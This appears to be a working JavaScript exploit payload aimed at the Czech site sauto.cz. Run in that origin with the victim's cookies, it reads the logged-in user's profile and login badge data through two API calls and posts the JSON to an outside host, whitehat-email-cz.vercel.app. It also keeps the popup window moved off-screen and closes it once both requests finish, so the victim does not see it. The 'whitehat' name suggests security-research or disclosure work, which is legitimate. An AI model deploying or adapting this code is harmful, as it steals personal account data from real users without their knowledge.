let getUsersSelfDataComplete = false;
let getUserBadgeDataComplete = false;

(function getUsersSelfData() {
    fetch(
        'https://www.sauto.cz/api/v1/users/self',
        {
            method: "GET",
            credentials: "same-origin",
            headers: {
                'Accept': 'application/json',
            },
        },
    )
        .then(response => response.json())
        .then((json) => {
            window.opener.postMessage({
                messageType: 'getUsersSelfData',
                response: json
            }, 'https://whitehat-email-cz.vercel.app/');
            getUsersSelfDataComplete = true;
        })
        .catch(error => {
            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
        });
})();

(function getUserBadgeData() {
    fetch(
        'https://login.sauto.cz/api/v1/user/badge?service=sauto',
        {
            method: "GET",
            credentials: "same-origin",
            headers: {
                'Accept': 'application/json',
            },
        },
    )
        .then(response => response.json())
        .then((json) => {
            window.opener.postMessage({
                messageType: 'getUserBadgeData',
                response: json
            }, 'https://whitehat-email-cz.vercel.app/');
            getUserBadgeDataComplete = true;
        })
        .catch(error => {
            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
        });
})();

window.addEventListener(
    "message",
    (event) => {
        if (event.data.messageType === 'move') {
            window.moveTo(event.data.data.x, event.data.data.y);
        }
    },
    false,
);

setInterval(() => {
    window.moveTo(1920, 1080);
    if (getUsersSelfDataComplete && getUserBadgeDataComplete) {
        window.close();
    }
}, 0);
